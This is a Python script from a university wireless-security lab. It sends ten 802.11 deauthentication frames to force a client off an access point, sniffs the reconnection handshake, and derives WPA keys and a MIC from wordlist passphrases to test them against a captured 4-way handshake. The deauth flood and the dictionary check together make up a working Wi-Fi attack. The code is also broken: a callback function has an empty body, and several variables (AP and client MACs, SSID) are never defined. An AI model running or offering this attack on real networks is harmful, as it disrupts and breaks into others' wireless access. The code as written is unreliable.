#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA). On vérifie également que le mic du fichier cap
correpond au mic de la passphrase définit
"""

__author__      = "Stefan Dejanovic et Nathanael Mizutani"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "stefan.dejanovic@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Checking if we put all the argument
if len(sys.argv) != 4:
    print("Please add arguments to use the script")
    print("1 argument: BSSID Client")
    print("1 argument: BSSID of AP")
    print("3 argument: Interface")
    exit()

# Read the passphrase from the file wordlist
f= open("wordlist","r")

if f.mode == 'r':
    passPhrase = f.read()

# Read capture file -- it contains beacon, authentication, association, handshake and data
wpa = rdpcap("wpa_handshake.cap")

# Array to store the Authenticator nonce and the Supplicant nonce
nonces = []

# Define the deauthification
pkt = RadioTap() / Dot11(addr1=sys.argv[1], addr2=sys.argv[2], addr3=sys.argv[2]) / Dot11Deauth(int(7))

# Send the deauthification
for x in range(0, 10):
    sendp(pkt, iface=sys.argv[3], verbose=False)

def pkt_callback(pkt):
    if pkt.haslayer(EAPOL):
       

wpa = sniff(iface=sys.argv[3], prn=pkt_callback)

# Important parameters for key derivation - most of them can be obtained from the pcap file
A           = "Pairwise key expansion" #this string is used in the pseudo-random function

# Authenticator and Supplicant Nonces
# We transform them to the correct encoding
ANonce      = a2b_hex(nonces[0])
SNonce      = a2b_hex(nonces[1])

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") #cf "Quelques détails importants" dans la donnée

# calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
passPhrase = str.encode(passPhrase)

pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)

# expand pmk to obtain PTK
ptk = customPRF512(pmk,str.encode(A), B)

# calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
mic = hmac.new(ptk[0:16],data,hashlib.sha1)


